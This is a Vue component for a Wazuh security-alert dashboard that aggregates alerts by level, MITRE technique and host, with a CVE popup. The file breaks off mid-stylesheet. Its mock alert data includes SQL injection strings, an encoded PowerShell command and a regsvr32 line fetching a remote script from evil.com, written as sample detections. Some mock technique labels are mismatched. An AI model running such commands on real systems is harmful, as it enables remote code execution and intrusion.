<template>
  <div class="tg-root flex flex-col h-full" v-loading="loading">
    <!-- 顶部工具栏 -->
    <div class="tg-toolbar flex items-center justify-between flex-shrink-0 px-4 py-3">
      <div class="flex items-center gap-2">
        <h3 class="tg-title m-0">🧬 攻击特征规律</h3>
        <span class="tg-subtitle">按告警等级聚合统计，关联 MITRE 技术与主机</span>
      </div>
      <button class="hq-btn-query" @click="fetchData" :disabled="loading">
        {{ loading ? '加载中...' : '⟳ 刷新数据' }}
      </button>
    </div>

    <!-- 时间范围筛选 -->
    <div class="level-filter-bar flex items-center gap-1.5 px-4 py-2 flex-shrink-0">
      <span class="level-filter-label">时间范围</span>
      <button
        v-for="opt in TIME_RANGES"
        :key="opt.key"
        :class="['level-chip', timeRange === opt.key ? 'level-chip--active' : 'level-chip--inactive']"
        @click="changeTimeRange(opt.key)"
      >
        {{ opt.label }}
      </button>
      <span class="summary-info">共 {{ summaryCount }} 个告警等级 · 累计 {{ summaryTotal.toLocaleString() }} 条告警</span>
    </div>

    <!-- 可滚动内容 -->
    <div class="tg-scroll flex-1 overflow-y-auto px-4 py-3">
      <!-- 主表：告警等级聚合 -->
      <div class="table-card">
        <div class="tc-title">
          <span>📌 告警等级分类汇总</span>
          <span class="tc-hint">点击行查看该等级告警明细</span>
        </div>
        <div class="al-list-header grid grid-cols-[1.1fr_1.6fr_1.6fr_0.9fr] gap-1 px-4 py-2.5 text-xs font-semibold">
          <span class="text-left">告警等级</span>
          <span class="text-left">技术关联 (MITRE)</span>
          <span class="text-left">涉及的主机 IP</span>
          <span class="text-center">告警总数</span>
        </div>
        <div class="al-list-body">
          <div
            v-for="row in tableRows"
            :key="row.key"
            class="al-row grid grid-cols-[1.1fr_1.6fr_1.6fr_0.9fr] gap-1 px-4 py-3 rounded-md cursor-pointer transition-all duration-200"
            @click="openDetail(row)"
          >
            <span class="flex items-center gap-1.5 text-xs font-semibold min-w-0">
              <span
                class="level-badge"
                :style="{ color: row.color, background: row.color + '18', borderColor: row.color + '40' }"
              >{{ row.level }}</span>
              <span class="truncate text-gray-500">{{ row.sevLabel }}</span>
            </span>
            <span class="flex flex-wrap gap-1 items-center">
              <template v-if="row.mitres.length">
                <template v-for="m in row.mitres.slice(0, 4)" :key="m">
                  <span class="tech-chip">{{ m }}</span>
                </template>
                <span v-if="row.mitres.length > 4" class="text-[10px] text-gray-400">+{{ row.mitres.length - 4 }}</span>
              </template>
              <span v-else class="text-xs text-gray-400">—</span>
            </span>
            <span class="flex flex-wrap gap-1 items-center">
              <template v-for="ip in row.ips.slice(0, 4)" :key="ip">
                <span class="ip-chip">{{ ip }}</span>
              </template>
              <span v-if="row.ips.length > 4" class="text-[10px] text-gray-400">+{{ row.ips.length - 4 }}</span>
              <span v-if="row.ips.length === 0" class="text-xs text-gray-400">—</span>
            </span>
            <span class="text-center">
              <span class="count-badge">{{ row.count.toLocaleString() }}</span>
              <span class="block text-[10px] text-[#31ABE3] opacity-70 mt-0.5">点击查看 ›</span>
            </span>
          </div>
          <div v-if="tableRows.length === 0" class="list-empty">
            当前时间范围内暂无告警数据，请切换时间范围或刷新重试
          </div>
        </div>
      </div>

      <!-- 柱状图：最常被利用的攻击技术 -->
      <div class="chart-card">
        <div class="cc-title">
          <span>📊 Top 攻击技术利用频率</span>
          <span class="cc-hint">横轴为 MITRE 技术 id，按告警数量排序，至多 10 项</span>
        </div>
        <div v-if="chartData.length > 0" id="attackPatternChart" class="chart-container"></div>
        <div v-else class="list-empty">暂无图表数据</div>
      </div>
    </div>

    <!-- 详情弹窗：该等级全部告警日志 -->
    <Teleport to="body">
      <div v-if="detailVisible" class="modal-mask" @click.self="detailVisible = false">
        <div class="modal-panel modal-panel--wide">
          <div class="modal-header">
            <h3 class="text-sm font-bold text-[#31ABE3] m-0">
              Level {{ detailType?.level }} · 告警明细
              <span class="detail-count">{{ detailLogs.length }} 条</span>
            </h3>
            <div class="flex items-center gap-2">
              <button class="modal-btn modal-btn--close" @click="detailVisible = false">关闭</button>
            </div>
          </div>
          <div class="modal-body" v-loading="detailLoading">
            <div class="detail-summary">
              <div class="detail-summary-item">
                <span class="label">技术关联：</span>
                <template v-if="detailType?.mitres?.length">
                  <span v-for="m in detailType.mitres" :key="m" class="tech-chip">{{ m }}</span>
                </template>
                <span v-else class="text-xs text-gray-400">—</span>
              </div>
              <div class="detail-summary-item">
                <span class="label">涉及主机 IP：</span>
                <template v-if="detailType?.ips?.length">
                  <span v-for="ip in detailType.ips" :key="ip" class="ip-chip">{{ ip }}</span>
                </template>
                <span v-else class="text-xs text-gray-400">—</span>
              </div>
            </div>

            <div class="dl-header grid grid-cols-[1fr_2fr_1.1fr_1.2fr_1fr] gap-1 px-4 py-2.5 text-xs font-semibold">
              <span class="text-center">时间</span>
              <span class="text-center">告警日志</span>
              <span class="text-center">技术关联编号</span>
              <span class="text-center">漏洞关联编号</span>
              <span class="text-center">涉及主机 IP</span>
            </div>
            <div
              v-for="log in detailLogs"
              :key="log._id || log.timestamp"
              class="dl-row grid grid-cols-[1fr_2fr_1.1fr_1.2fr_1fr] gap-1 px-4 py-2.5 rounded-md transition-all duration-200"
            >
              <span class="text-center text-xs truncate text-gray-400 font-mono">{{ log.formattedTime }}</span>
              <span class="text-center text-xs truncate cursor-pointer text-[#31ABE3] hover:underline" @click="openLog(log)">
                {{ log.rule?.description || log.rule?.id || '—' }}
              </span>
              <span class="text-center text-xs truncate">
                <template v-if="log.rule?.mitre?.id?.length">
                  <span v-for="m in log.rule.mitre.id" :key="m" class="tech-chip">{{ m }}</span>
                </template>
                <span v-else class="text-gray-400">—</span>
              </span>
              <span class="text-center text-xs truncate">
                <template v-if="log.vulnerability?.id">
                  <span class="cve-chip" @click.stop="openCve(log.vulnerability.id)">{{ log.vulnerability.id }}</span>
                </template>
                <span v-else class="text-gray-400">—</span>
              </span>
              <span class="text-center text-xs truncate text-gray-500 font-mono">{{ log.agent?.ip || '—' }}</span>
            </div>
            <div v-if="detailLogs.length === 0 && !detailLoading" class="list-empty">该等级暂无告警日志</div>
          </div>
        </div>
      </div>
    </Teleport>

    <!-- 告警日志内容弹窗 -->
    <Teleport to="body">
      <div v-if="logVisible" class="modal-mask" @click.self="logVisible = false">
        <div class="modal-panel">
          <div class="modal-header">
            <h3 class="text-sm font-bold text-[#31ABE3] m-0">告警日志内容</h3>
            <div class="flex items-center gap-2">
              <button class="modal-btn modal-btn--copy" @click="copyToClipboard(currentLog?.raw)">复制明细</button>
              <button class="modal-btn modal-btn--close" @click="logVisible = false">关闭</button>
            </div>
          </div>
          <div class="modal-body">
            <div class="log-meta">
              <div class="log-meta-item"><span class="label">时间</span>{{ currentLog?.formattedTime }}</div>
              <div class="log-meta-item"><span class="label">规则</span>#{{ currentLog?.rule?.id }} · Level {{ currentLog?.rule?.level }} · {{ currentLog?.rule?.groups?.join(', ') }}</div>
              <div class="log-meta-item" v-if="currentLog?.rule?.mitre?.id?.length"><span class="label">技术关联</span>{{ currentLog?.rule?.mitre?.id?.join(', ') }}</div>
              <div class="log-meta-item"><span class="label">主机</span>{{ currentLog?.agent?.name }} (ID: {{ currentLog?.agent?.id }}) @ {{ currentLog?.agent?.ip }}</div>
              <div class="log-meta-item" v-if="currentLog?.vulnerability?.id"><span class="label">关联漏洞</span>{{ currentLog?.vulnerability?.id }}</div>
            </div>
            <pre class="modal-pre">{{ currentLog?.raw }}</pre>
          </div>
        </div>
      </div>
    </Teleport>

    <!-- 漏洞简要信息弹窗 -->
    <Teleport to="body">
      <div v-if="cveVisible" class="modal-mask" @click.self="cveVisible = false">
        <div class="modal-panel modal-panel--small">
          <div class="modal-header">
            <h3 class="text-sm font-bold text-[#31ABE3] m-0">漏洞简要信息</h3>
            <button class="modal-btn modal-btn--close" @click="cveVisible = false">关闭</button>
          </div>
          <div class="modal-body" v-loading="cveLoading">
            <template v-if="cveInfo">
              <div class="cve-info">
                <div class="cve-head">
                  <span class="cve-id">{{ cveInfo.id }}</span>
                  <span class="cve-sev" :style="{ color: getSeverityColor(cveInfo.severity), background: getSeverityColor(cveInfo.severity) + '18' }">
                    {{ cveInfo.severity }}
                  </span>
                </div>
                <div class="cve-row"><span class="label">严重程度</span>{{ cveInfo.severity }}<span v-if="cveInfo.cvss != null">（CVSS {{ cveInfo.cvss }}）</span></div>
                <div class="cve-row"><span class="label">涉及软件包</span>{{ cveInfo.package }} <span v-if="cveInfo.version">{{ cveInfo.version }}</span></div>
                <div class="cve-row cve-desc"><span class="label">简要描述</span>{{ cveInfo.description }}</div>
                <div class="cve-row" v-if="cveInfo.reference">
                  <span class="label">官方参考</span>
                  <a class="cve-link" :href="cveInfo.reference" target="_blank" rel="noopener">{{ cveInfo.reference }}</a>
                </div>
                <div class="cve-row" v-if="cveInfo.notFound"><span class="label">提示</span><span class="text-gray-400">告警数据中未检索到该漏洞的详细描述</span></div>
              </div>
            </template>
          </div>
        </div>
      </div>
    </Teleport>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, onBeforeUnmount, nextTick } from "vue";
import { ElMessage } from "element-plus";
import axios from 'axios';
import * as echarts from 'echarts';

// ─────────────────────────────────────────────
// 1. 环境配置与通用工具
// ─────────────────────────────────────────────
const indexerUser = import.meta.env.VITE_WAZUH_INDEXER_USER;
const indexerPass = import.meta.env.VITE_WAZUH_INDEXER_PASSWORD;
const INDEXER_AUTH = btoa(`${indexerUser}:${indexerPass}`);

const formatDateTime = (ts?: string) => ts ? new Date(ts).toLocaleString('zh-CN') : '--';

const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(() => ElMessage.success("JSON 内容已复制"));
};

// ─────────────────────────────────────────────
// 2. 时间范围与等级信息
// ─────────────────────────────────────────────
const TIME_RANGES = [
  { key: '24h', label: '最近24小时', range: { gte: 'now-24h' } },
  { key: '7d',  label: '最近7天',    range: { gte: 'now-7d' } },
  { key: '30d', label: '最近30天',   range: { gte: 'now-30d' } },
  { key: 'all', label: '全部',       range: null }
];

// 告警等级 → 严重程度与配色（Wazuh rule.level 0-15）
const getLevelInfo = (level: number) => {
  if (level >= 12) return { color: '#f5023d', sevLabel: '严重' };
  if (level >= 7)  return { color: '#e3b337', sevLabel: '高危' };
  if (level >= 4)  return { color: '#31ABE3', sevLabel: '中危' };
  return { color: '#6c7a89', sevLabel: '低危' };
};

const getSeverityColor = (severity: string) => {
  switch (severity?.toLowerCase()) {
    case 'critical': return '#f5023d';
    case 'high':     return '#e3b337';
    case 'medium':   return '#31ABE3';
    default:         return '#7c8a9e';
  }
};

const buildTimeQuery = () => {
  const tr = TIME_RANGES.find(t => t.key === timeRange.value);
  return tr?.range ? { range: { timestamp: tr.range } } : { match_all: {} };
};

// ─────────────────────────────────────────────
// 3. 状态管理
// ─────────────────────────────────────────────
const loading = ref(false);
const timeRange = ref('24h');
const summaryCount = ref(0);
const summaryTotal = ref(0);
const tableRows = ref<any[]>([]);
const chartData = ref<any[]>([]);
let chartInstance: echarts.ECharts | null = null;

// 详情弹窗
const detailVisible = ref(false);
const detailType = ref<any>(null);
const detailLogs = ref<any[]>([]);
const detailLoading = ref(false);

// 告警日志弹窗
const logVisible = ref(false);
const currentLog = ref<any>(null);

// 漏洞弹窗
const cveVisible = ref(false);
const cveInfo = ref<any>(null);
const cveLoading = ref(false);

// 是否为演示数据模式
let isMockMode = false;

// ─────────────────────────────────────────────
// 4. 主数据获取（真实索引聚合 + 演示数据回退）
// ─────────────────────────────────────────────
const fetchData = async () => {
  loading.value = true;
  try {
    const ok = await fetchRealData();
    if (!ok) {
      await useMockData();
    }
  } catch (err) {
    console.error('攻击特征数据拉取失败', err);
    await useMockData();
    ElMessage.info('当前使用演示数据（API未连接）');
  } finally {
    loading.value = false;
    await nextTick();
    renderChart();
  }
};

const fetchRealData = async (): Promise<boolean> => {
  const res = await axios.post('/wazuh-indexer/wazuh-alerts-*/_search', {
    size: 0,
    query: buildTimeQuery(),
    aggs: {
      // 主表：按告警等级聚合，子聚合取 MITRE 技术与主机 IP
      by_level: {
        terms: { field: 'rule.level', size: 20, order: { '_count': 'desc' } },
        aggs: {
          by_mitre: { terms: { field: 'rule.mitre.id', size: 10 } },
          by_ip:    { terms: { field: 'agent.ip', size: 10 } }
        }
      },
      // 柱状图：Top 攻击技术（MITRE 技术 id 的告警数量）
      top_mitre: { terms: { field: 'rule.mitre.id', size: 10 } }
    }
  }, {
    headers: { 'Authorization': `Basic ${INDEXER_AUTH}`, 'Content-Type': 'application/json' }
  });

  const levelBuckets = res.data.aggregations?.by_level?.buckets || [];
  let totalAlerts = 0;

  const rows: any[] = levelBuckets.map((b: any) => {
    totalAlerts += b.doc_count;
    const info = getLevelInfo(Number(b.key));
    return {
      key: String(b.key),
      level: Number(b.key),
      sevLabel: info.sevLabel,
      color: info.color,
      mitres: (b.by_mitre?.buckets || []).map((x: any) => x.key),
      ips: (b.by_ip?.buckets || []).map((x: any) => x.key),
      count: b.doc_count,
      filter: { term: { 'rule.level': b.key } }
    };
  });

  tableRows.value = rows.filter((r: any) => r.count > 0).sort((a: any, b: any) => b.count - a.count);
  summaryCount.value = tableRows.value.length;
  summaryTotal.value = totalAlerts;

  // 柱状图：Top 攻击技术（MITRE 技术 id 的告警数量）
  chartData.value = (res.data.aggregations?.top_mitre?.buckets || [])
    .map((x: any) => ({ name: x.key, value: x.doc_count }))
    .slice(0, 10);

  isMockMode = false;
  return true;
};

// 切换时间范围
const changeTimeRange = (key: string) => {
  timeRange.value = key;
  fetchData();
};

// 打开等级详情（该等级全部告警日志）
const openDetail = async (row: any) => {
  detailType.value = row;
  detailLogs.value = [];
  detailVisible.value = true;
  detailLoading.value = true;

  try {
    if (isMockMode) {
      detailLogs.value = (MOCK_DETAIL[row.key] || []).map((s: any) => ({
        ...s,
        formattedTime: formatDateTime(s.timestamp),
        raw: JSON.stringify(s, null, 2)
      }));
      return;
    }
    const res = await axios.post('/wazuh-indexer/wazuh-alerts-*/_search', {
      size: 200,
      query: { bool: { must: [buildTimeQuery(), row.filter] } },
      sort: [{ timestamp: { order: 'desc' } }]
    }, {
      headers: { 'Authorization': `Basic ${INDEXER_AUTH}`, 'Content-Type': 'application/json' }
    });
    detailLogs.value = res.data.hits.hits.map((h: any) => ({
      _id: h._id,
      ...h._source,
      formattedTime: formatDateTime(h._source.timestamp),
      raw: JSON.stringify(h._source, null, 2)
    }));
  } catch (err) {
    console.error('告警明细拉取失败', err);
    detailLogs.value = (MOCK_DETAIL[row.key] || []).map((s: any) => ({
      ...s,
      formattedTime: formatDateTime(s.timestamp),
      raw: JSON.stringify(s, null, 2)
    }));
  } finally {
    detailLoading.value = false;
  }
};

// 打开告警日志内容弹窗
const openLog = (log: any) => {
  currentLog.value = log;
  logVisible.value = true;
};

// 打开漏洞简要信息弹窗
const openCve = async (cve: string) => {
  if (!cve || cve === '—') return;
  cveVisible.value = true;
  cveInfo.value = null;
  cveLoading.value = true;

  if (isMockMode) {
    cveInfo.value = MOCK_CVE_INFO[cve] || { id: cve, severity: 'Unknown', description: '告警数据中未检索到该漏洞的详细描述', package: '-', notFound: true };
    cveLoading.value = false;
    return;
  }

  try {
    const res = await axios.post('/wazuh-indexer/wazuh-states-vulnerabilities-*/_search', {
      size: 1,
      query: { term: { 'vulnerability.id': cve } }
    }, {
      headers: { 'Authorization': `Basic ${INDEXER_AUTH}`, 'Content-Type': 'application/json' }
    });
    const hit = res.data.hits.hits[0];
    if (hit) {
      const s = hit._source;
      cveInfo.value = {
        id: s.vulnerability?.id || cve,
        severity: s.vulnerability?.severity || 'Unknown',
        description: s.vulnerability?.description || '暂无描述',
        package: s.package?.name || '-',
        version: s.package?.version || '',
        reference: s.vulnerability?.reference || '',
        cvss: s.vulnerability?.cvss?.score != null ? s.vulnerability.cvss.score : null
      };
    } else {
      cveInfo.value = { id: cve, severity: 'Unknown', description: '告警数据中未检索到该漏洞的详细描述', package: '-', notFound: true };
    }
  } catch (err) {
    console.error('漏洞详情拉取失败', err);
    cveInfo.value = { id: cve, severity: 'Unknown', description: '告警数据中未检索到该漏洞的详细描述', package: '-', notFound: true };
  } finally {
    cveLoading.value = false;
  }
};

// ─────────────────────────────────────────────
// 5. 柱状图渲染
// ─────────────────────────────────────────────
const renderChart = () => {
  const dom = document.getElementById('attackPatternChart');
  if (!dom) return;
  if (!chartInstance) chartInstance = echarts.init(dom);

  const colors = ['#31ABE3', '#f5023d', '#e3b337', '#6bcb77', '#6c7a89', '#a36ae8', '#e36a8b'];

  const option = {
    tooltip: {
      trigger: 'axis',
      axisPointer: { type: 'shadow' },
      formatter: (params: any) => `${params[0].name}<br/>告警日志数量: ${params[0].value}`
    },
    grid: { left: '3%', right: '4%', bottom: '6%', top: '12%', containLabel: true },
    xAxis: {
      type: 'category',
      data: chartData.value.map(d => d.name),
      axisLabel: {
        color: '#666',
        fontSize: 11,
        interval: 0,
        rotate: chartData.value.length > 5 ? 30 : 0
      },
      axisLine: { lineStyle: { color: '#e0e0e0' } }
    },
    yAxis: {
      type: 'value',
      name: '告警数量',
      nameTextStyle: { color: '#7c8a9e', fontSize: 11 },
      axisLabel: { color: '#666' },
      splitLine: { lineStyle: { color: '#f0f0f0' } }
    },
    series: [{
      type: 'bar',
      barWidth: '42%',
      data: chartData.value.map((d: any, i: number) => {
        const base = colors[i % colors.length];
        return {
          value: d.value,
          itemStyle: {
            color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [
              { offset: 0, color: base },
              { offset: 1, color: base + '66' }
            ]),
            borderRadius: [4, 4, 0, 0]
          }
        };
      }),
      label: { show: true, position: 'top', color: '#666', fontSize: 11 }
    }]
  };

  chartInstance.setOption(option, true);
  chartInstance.resize();
};

const handleResize = () => {
  chartInstance?.resize();
};

// ─────────────────────────────────────────────
// 6. 演示数据
// ─────────────────────────────────────────────
const MOCK_LEVELS: any[] = [
  { level: 4,  count: 328, mitres: ['T1590.001'],                    ips: ['192.168.74.128'] },
  { level: 5,  count: 210, mitres: ['T1110.001'],                    ips: ['192.168.74.133', '192.168.74.131'] },
  { level: 8,  count: 96,  mitres: ['T1567.002', 'T1041'],           ips: ['192.168.74.128'] },
  { level: 10, count: 156, mitres: ['T1190', 'T1110'],               ips: ['192.168.74.131', '192.168.74.132'] },
  { level: 12, count: 87,  mitres: ['T1047', 'T1053.005'],           ips: ['192.168.74.131', '192.168.74.128'] },
  { level: 15, count: 42,  mitres: ['T1059.001', 'T1218.011'],       ips: ['192.168.74.128'] }
];

const MOCK_CHART = [
  { name: 'T1590.001', value: 328 },
  { name: 'T1110.001', value: 210 },
  { name: 'T1190', value: 156 },
  { name: 'T1110', value: 89 },
  { name: 'T1047', value: 64 },
  { name: 'T1059.001', value: 42 }
];

const MOCK_DETAIL: Record<string, any[]> = {
  '4': [
    { timestamp: '2026-08-24T10:32:11.000Z', rule: { id: '20100', level: 4, description: 'Traffic volume anomaly detected', groups: ['ids', 'attack'], mitre: { id: ['T1590.001'], tactic: ['Reconnaissance'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.128' }, data: { srcip: '10.0.0.55', dstport: '443' } },
    { timestamp: '2026-08-24T10:30:05.000Z', rule: { id: '20102', level: 4, description: 'Connection rate abnormal', groups: ['ids', 'attack'], mitre: { id: ['T1590.001'], tactic: ['Reconnaissance'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.128' }, data: { srcip: '10.0.0.66' } }
  ],
  '5': [
    { timestamp: '2026-08-24T09:58:22.000Z', rule: { id: '5500', level: 5, description: 'Authentication failure', groups: ['authentication_failures', 'pam'], mitre: { id: ['T1110.001'], tactic: ['Credential Access'] } }, agent: { id: '001', name: 'agent-VMware-Virtual-Platform', ip: '192.168.74.131' }, data: { srcip: '192.168.74.199', user: 'root' } },
    { timestamp: '2026-08-24T09:40:03.000Z', rule: { id: '5502', level: 5, description: 'Invalid login attempt', groups: ['authentication_failures', 'syslog'], mitre: { id: ['T1110.001'], tactic: ['Credential Access'] } }, agent: { id: '003', name: 'centos-server', ip: '192.168.74.133' }, data: { srcip: '192.168.74.201', user: 'admin' } }
  ],
  '8': [
    { timestamp: '2026-08-24T09:20:41.000Z', rule: { id: '20104', level: 8, description: 'Port scan detected', groups: ['ids', 'attack'], mitre: { id: ['T1041'], tactic: ['Exfiltration'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.128' }, data: { srcip: '172.16.0.9', dstport: '3389' } }
  ],
  '10': [
    { timestamp: '2026-08-24T09:12:30.000Z', rule: { id: '31100', level: 10, description: 'SQL injection attempt', groups: ['attack', 'sql_injection'], mitre: { id: ['T1190'], tactic: ['Initial Access'] } }, agent: { id: '001', name: 'agent-VMware-Virtual-Platform', ip: '192.168.74.131' }, vulnerability: { id: 'CVE-2026-27447', severity: 'High' }, data: { srcip: '10.0.0.55', url: '/products.php?id=1%20AND%201=1' } },
    { timestamp: '2026-08-24T09:10:12.000Z', rule: { id: '31104', level: 10, description: 'Potential SQL injection', groups: ['attack', 'sql_injection'], mitre: { id: ['T1190'], tactic: ['Initial Access'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.132' }, vulnerability: { id: 'CVE-2026-33824', severity: 'Critical' }, data: { srcip: '10.0.0.66', url: '/login.php?username=admin\'--' } }
  ],
  '12': [
    { timestamp: '2026-08-24T08:55:12.000Z', rule: { id: '5710', level: 12, description: 'Maximum authentication attempts exceeded', groups: ['authentication_failures', 'ssh'], mitre: { id: ['T1110'], tactic: ['Credential Access'] } }, agent: { id: '001', name: 'agent-VMware-Virtual-Platform', ip: '192.168.74.131' }, data: { srcip: '192.168.74.200', user: 'admin' } },
    { timestamp: '2026-08-24T08:50:33.000Z', rule: { id: '20106', level: 12, description: 'Denial of service attack', groups: ['ids', 'attack'], mitre: { id: ['T1047'], tactic: ['Execution'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.128' }, data: { srcip: '172.16.0.20', dstport: '443' } }
  ],
  '15': [
    { timestamp: '2026-08-24T08:30:15.000Z', rule: { id: '92200', level: 15, description: 'PowerShell encoded command detected', groups: ['windows', 'powershell', 'attack'], mitre: { id: ['T1059.001'], tactic: ['Execution'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.128' }, data: { command: 'powershell -enc SQBFAFgA' } },
    { timestamp: '2026-08-24T08:21:44.000Z', rule: { id: '92210', level: 15, description: 'Regsvr32 remote script execution', groups: ['windows', 'attack'], mitre: { id: ['T1218.011'], tactic: ['Defense Evasion'] } }, agent: { id: '002', name: 'windows001', ip: '192.168.74.128' }, data: { command: 'regsvr32 /s /n /u /i:http://evil.com/x scrobj.dll' } }
  ]
};

const MOCK_CVE_INFO: Record<string, any> = {
  'CVE-2026-27447': { id: 'CVE-2026-27447', severity: 'High', cvss: 8.1, description: 'A SQL injection vulnerability in the product query interface allows remote attackers to execute arbitrary SQL statements via crafted parameters.', package: 'mysql-server', version: '8.0.35', reference: 'https://nvd.nist.gov/vuln/detail/CVE-2026-27447' },
  'CVE-2026-33824': { id: 'CVE-2026-33824', severity: 'Critical', cvss: 9.8, description: 'A critical authentication bypass vulnerability in the login module that allows unauthorized access without valid credentials.', package: 'php', version: '8.2.15', reference: 'https://nvd.nist.gov/vuln/detail/CVE-2026-33824' },
  'CVE-2026-34978': { id: 'CVE-2026-34978', severity: 'High', cvss: 7.5, description: 'A buffer overflow in the search API endpoint could lead to remote code execution with crafted HTTP requests.', package: 'nginx', version: '1.24.0', reference: 'https://nvd.nist.gov/vuln/detail/CVE-2026-34978' }
};

const useMockData = async () => {
  isMockMode = true;
  tableRows.value = MOCK_LEVELS.map(l => {
    const info = getLevelInfo(l.level);
    return {
      key: String(l.level),
      level: l.level,
      sevLabel: info.sevLabel,
      color: info.color,
      mitres: l.mitres,
      ips: l.ips,
      count: l.count,
      filter: { term: { 'rule.level': l.level } }
    };
  }).sort((a, b) => b.count - a.count);
  summaryCount.value = tableRows.value.length;
  summaryTotal.value = MOCK_LEVELS.reduce((s, l) => s + l.count, 0);
  chartData.value = MOCK_CHART.slice(0, 10);
};

// ─────────────────────────────────────────────
// 7. 生命周期
// ─────────────────────────────────────────────
onMounted(() => {
  fetchData();
  window.addEventListener('resize', handleResize);
});

onBeforeUnmount(() => {
  window.removeEventListener('resize', handleResize);
  chartInstance?.dispose();
  chartInstance = null;
});
</script>

<style scoped lang="scss">
/* 与 VulnerabilityQuery 保持一致的高端冷色调 UI */
.tg-root {
  background: var(--background, #ffffff);
  border-radius: 8px;
  border: 1px solid #e5e7eb;
  position: relative;
  overflow: hidden;
  height: 100%;
}

.tg-toolbar {
  border-bottom: 1px solid #e5e7eb;
  background: #f8fafc;

  .tg-title {
    font-size: 15px;
    font-weight: 700;
    color: #1f2937;
  }

  .tg-subtitle {
    font-size: 11px;
    color: var(--muted-foreground, #7c8a9e);
    margin-left: 2px;
  }
}

.summary-info {
  margin-left: auto;
  font-size: 11.5px;
  color: var(--muted-foreground, #7c8a9e);
  white-space: nowrap;
}

.level-filter-bar {
  border-bottom: 1px solid #e5e7eb;
  background: #f8fafc;
}

.level-filter-label {
  font-size: 11px;
  color: var(--muted-foreground, #7c8a9e);
  margin-right: 6px;
  white-space: nowrap;
  user-select: none;
}

.level-chip {
  padding: 3px 10px;
  font-size: 11px;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s ease;
  border: none;

  &--inactive {
    background: transparent;
    color: var(--muted-foreground, #7c8a9e);
    border: 1px solid var(--border, rgba(49, 171, 227, 0.12));
    &:hover { border-color: rgba(49, 171, 227, 0.3); color: var(--foreground); }
  }

  &--active {
    background: rgba(49, 171, 227, 0.12);
    color: #31ABE3;
    border: 1px solid rgba(49, 171, 227, 0.25);
  }
}

.tg-scroll {
  &::-webkit-scrollbar { width: 3px; }
  &::-webkit-scrollbar-thumb { background: rgba(124, 138, 158, 0.15); border-radius: 2px; }
}

/* 卡片 */
.table-card,
.chart-card {
  background: #ffffff;
  border: 1px solid #e5e7eb;
  border-radius: 10px;
  margin-bottom: 14px;
  overflow: hidden;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
}

.tc-title,
.cc-title {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 16px;
  border-bottom: 1px solid #e5e7eb;
  background: #f8fafc;
  font-size: 13px;
  font-weight: 600;
  color: #374151;

  .tc-hint, .cc-hint {
    font-size: 10.5px;
    font-weight: 400;
    color: var(--muted-foreground, #7c8a9e);
  }
}

/* 主表 */
.al-list-header {
  background: #f8fafc;
  color: var(--muted-foreground, #7c8a9e);
  border-bottom: 1px solid #e5e7eb;
}

.al-list-body {
  position: relative;
}

.al-row {
  border-bottom: 1px solid rgba(229, 231, 235, 0.5);
  &:hover { background: rgba(49, 171, 227, 0.04); }
  &:last-child { border-bottom: none; }
}

.level-badge {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  min-width: 28px;
  height: 22px;
  padding: 0 7px;
  font-size: 13px;
  font-weight: 700;
  font-family: ui-monospace, monospace;
  border: 1px solid;
  border-radius: 6px;
  flex-shrink: 0;
}

.tech-chip {
  display: inline-flex;
  align-items: center;
  padding: 1px 8px;
  font-size: 10.5px;
  font-weight: 600;
  font-family: ui-monospace, monospace;
  color: #7c3aed;
  background: rgba(124, 58, 237, 0.08);
  border: 1px solid rgba(124, 58, 237, 0.2);
  border-radius: 999px;
  white-space: nowrap;
}

.cve-chip {
  display: inline-flex;
  align-items: center;
  padding: 1px 8px;
  font-size: 10.5px;
  font-weight: 600;
  font-family: ui-monospace, monospace;
  color: #31ABE3;
  background: rgba(49, 171, 227, 0.08);
  border: 1px solid rgba(49, 171, 227, 0.2);
  border-radius: 999px;
  cursor: pointer;
  transition: all 0.2s ease;
  white-space: nowrap;

  &:hover {
    background: rgba(49, 171, 227, 0.18);
    border-color: rgba(49, 171, 227, 0.35);
  }
}

.ip-chip {
  display: inline-flex;
  align-items: center;
  padding: 1px 8px;
  font-size: 10.5px;
  font-family: ui-monospace, monospace;
  color: #6b7280;
  background: #f3f4f6;
  border: 1px solid #e5e7eb;
  border-radius: 999px;
  white-space: nowrap;
}

.count-badge {
  display: inline-block;
  min-width: 40px;
  padding: 2px 10px;
  font-size: 13px;
  font-weight: 700;
  font-family: ui-monospace, monospace;
  color: #1d4ed8;
  background: rgba(49, 171, 227, 0.1);
  border: 1px solid rgba(49, 171, 227, 0.18);
  border-radius: 6px;
}

.list-empty {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 40px 20px;
  font-size: 12px;
  color: #7c8a9e;
  opacity: 0.5;
  text-align: center;
}

/* 柱状图 */
.chart-container {
  height: 300px;
  width: 100%;
  padding: 8px 0;
}

/* ── 弹窗 ── */
.modal-mask {
  position: fixed;
  inset: 0;
  background: rgba(255, 255, 255, 0.9);
  backdrop-filter: blur(4px);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.modal-panel {
  width: 75%;
  max-height: 85vh;
  background: var(--card, #ffffff);
  border: 1px solid #e5e7eb;
  border-radius: 10px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);

  &--wide {
    width: 88%;
    max-width: 1200px;
  }

  &--small {
    width: 520px;
    max-width: 90vw;
  }

  .modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 14px 20px;
    border-bottom: 1px solid #e5e7eb;
    flex-shrink: 0;
  }

  .modal-body {
    flex: 1;
    min-height: 0;
    overflow: auto;
    padding: 16px 20px;
  }

  .modal-pre {
    margin: 0;
    color: #374151;
    font-family: 'Courier New', ui-monospace, monospace;
    font-size: 12.5px;
    white-space: pre-wrap;
    word-break: break-all;
    line-height: 1.6;
  }
}

.detail-count {
  margin-left: 8px;
  font-size: 11px;
  font-weight: 500;
